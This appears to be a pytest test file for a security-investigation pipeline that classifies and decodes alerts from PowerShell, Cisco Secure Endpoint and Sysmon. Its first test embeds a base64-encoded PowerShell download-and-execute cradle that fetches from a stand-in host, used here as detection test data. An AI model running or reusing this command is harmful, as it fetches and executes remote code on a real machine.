"""End-to-end Phase 1 pipeline + Contract #11 acceptance tests."""
import json

from nivxforge.investigation.pipeline.contract_check import (
    UNKNOWN, check_contract11,
)
from nivxforge.investigation.pipeline.orchestrator import run_phase1


def test_end_to_end_encoded_powershell():
    raw = ("powershell.exe -EncodedCommand "
            "SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAu"
            "AE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGE"
            "AZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBiAGEAZAAuAGMAbw"
            "BtAC8AcAAxACcAKQAp")
    state = run_phase1(raw)
    s = state.summary()
    assert s["classification"] == "encoded_cmd"
    assert s["decoded_layers"] >= 1
    assert s["graph_nodes"] >= 2
    # URL evidence surfaced from decoded payload
    urls = state.evidence.by_kind("url")
    assert any("bad.com" in u.value for u in urls)
    # Trace covers all 9 stages.
    stage_names = [t["stage"] for t in state.stage_trace]
    assert stage_names == [
        "input_classification", "parser", "vendor_detection",
        "vendor_normalization", "artifact_discovery",
        "recursive_decoder", "evidence_extraction",
        "investigation_graph", "evidence_validation",
    ]


def test_end_to_end_cisco_secure_endpoint_full():
    """Contract #11: Cisco Secure Endpoint payload must answer at
    least 7/12 questions (Phase 1 scope)."""
    payload = json.dumps({
        "id": "e-7", "date": "2026-01-15T10:00:00Z",
        "detection": "W32.Emotet.Gen",
        "event_type": "Threat Detected",
        "event_type_id": 1090519054,
        "connector_guid": "cg-777", "severity": "High",
        "threat_family": "Emotet",
        "computer": {"connector_guid": "cg-777", "hostname": "WKS-77",
                     "operating_system": "Windows 10"},
        "file": {"disposition": "Malicious",
                 "file_name": "invoice.exe",
                 "file_path": "C:/Users/John/Downloads/invoice.exe",
                 "identity": {"sha256": "1" * 64, "md5": "2" * 32}},
        "network_info": {"remote_ip": "198.51.100.7",
                          "remote_port": 443,
                          "dirty_url": "http://bad.example/p1"},
    })
    state = run_phase1(payload)
    assert state.vendor.vendor == "cisco_secure_endpoint"
    assert state.cem.vendor_route == "cisco_secure_endpoint"

    report = check_contract11(state)
    # Phase 1 scope: at least 7 out of 12 must be answered.
    assert report.answered_count >= 7, f"only {report.answered_count} answered"

    # Threat family must resolve because vendor set it.
    family_ans = next(
        a for a in report.answers
        if a.question == "What threat family or malware is most likely?"
    )
    assert "Emotet" in family_ans.answer


def test_end_to_end_sysmon_process_create():
    state = run_phase1(json.dumps({
        "EventID": 1, "Computer": "host-a",
        "User": "CORP\\alice",
        "Image": "C:/Windows/System32/cmd.exe",
        "CommandLine": "cmd.exe /c whoami",
        "ParentImage": "C:/explorer.exe",
        "ParentCommandLine": "explorer.exe",
        "ProcessId": 1234, "ParentProcessId": 100,
        "Hashes": "SHA256=" + "e" * 64,
    }))
    assert state.vendor.vendor == "sysmon"
    # Host + user + process + command all in graph
    kinds = {n.kind for n in state.graph.nodes}
    assert {"host", "user", "process", "command", "hash"}.issubset(kinds)
    # Contract 11 sanity — at least 5 answers with process context
    r = check_contract11(state)
    assert r.answered_count >= 5


def test_empty_input_is_handled_gracefully():
    state = run_phase1("")
    # Even empty input produces a valid state with 0 events.
    assert state.summary()["events"] == 0
    assert not state.validation.errors


def test_generic_json_never_stops_pipeline():
    state = run_phase1(json.dumps({"foo": "bar", "baz": 1}))
    assert state.vendor.vendor == "generic_json"
    # Pipeline still emits a state; no exceptions raised
    assert state.summary()["events"] >= 0


def test_investigation_graph_is_the_source_of_truth_for_contract11():
    """Regression · Contract invariant: `check_contract11` must reason
    from graph nodes only — not the CEM or raw input."""
    payload = json.dumps({
        "EventID": 1, "Computer": "h1",
        "Image": "cmd.exe", "CommandLine": "cmd /c whoami",
    })
    state = run_phase1(payload)
    r = check_contract11(state)
    # Every non-UNKNOWN answer should reference graph node ids.
    for a in r.answers:
        if a.answer != UNKNOWN and a.graph_node_ids:
            for nid in a.graph_node_ids:
                assert state.graph.node(nid) is not None
